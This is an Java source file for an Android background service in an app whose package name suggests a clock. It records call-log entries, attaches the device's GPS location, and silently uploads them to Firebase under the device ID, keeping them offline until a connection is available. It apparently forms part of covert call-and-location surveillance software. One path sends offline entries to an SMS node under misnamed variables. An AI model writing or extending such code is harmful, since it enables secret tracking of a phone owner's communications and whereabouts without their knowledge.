package com.aftab.clock.Services;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;

import androidx.annotation.Nullable;

import com.aftab.clock.Model.CallLogs;
import com.aftab.clock.Receivers.NetworkChangeReceiver;
import com.aftab.clock.Utills.Constants;
import com.aftab.clock.Utills.FireRef;
import com.aftab.clock.Utills.Functions;
import com.aftab.clock.Utills.SharedPref;

import java.util.ArrayList;

import im.delight.android.location.SimpleLocation;

public class UploadNewCallLog extends IntentService {
    public static double longitude = 0;
    public static double latitude = 0;
    Context context;
    SharedPref sh;
    CallLogs intentCall;
    private SimpleLocation simpleLocation;

    public UploadNewCallLog() {
        super("UploadCallLog");
    }


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {

        assert intent != null;
        intentCall = (CallLogs) intent.getSerializableExtra(Constants.CALL_LOGS);


        longitude = simpleLocation.getLongitude();
        latitude = simpleLocation.getLatitude();

        String deviceID = Functions.getDeviceId(context);


        String latLng = longitude + "," + latitude;


        intentCall.setLocation(latLng);


        if (!NetworkChangeReceiver.isOnline(context)) {

            ArrayList<CallLogs> simSMSArrayList = sh.getCallLogsList(Constants.CALL_LOGS);
            simSMSArrayList.add(intentCall);

            sh.saveCallLogsList(simSMSArrayList, Constants.CALL_LOGS);

            //save to offline
           // Toast.makeText(context, "OUT Call", Toast.LENGTH_SHORT).show();

        } else {

            //Toast.makeText(context, "IN Call", Toast.LENGTH_SHORT).show();

            ArrayList<CallLogs> callLogsList = sh.getCallLogsList(Constants.CALL_LOGS);

            if (callLogsList != null) {

                if (callLogsList.size() > 0) {

                    for (int i = 0; i < callLogsList.size(); i++) {

                        CallLogs callLogs = callLogsList.get(i);


                        String pushId2 = callLogs.getCallDate() + callLogs.getPhoneNumber();


                        FireRef.SIM_SMS.child(deviceID)
                                .child(callLogs.getPhoneNumber())
                                .child(pushId2)
                                .setValue(callLogs).addOnCompleteListener(task -> stopSelf());

                    }
                }
            }

            sh.removeList(Constants.CALL_LOGS);

            FireRef.CALL_LOGS.child(deviceID)
                    .child(intentCall.getPhoneNumber())
                    .child(intentCall.getId())
                    .setValue(intentCall).addOnCompleteListener(task ->
                    stopSelf());
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        context = this;
        sh = new SharedPref(context);
        simpleLocation = new SimpleLocation(this);
        simpleLocation.beginUpdates();
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
        simpleLocation.endUpdates();
    }
}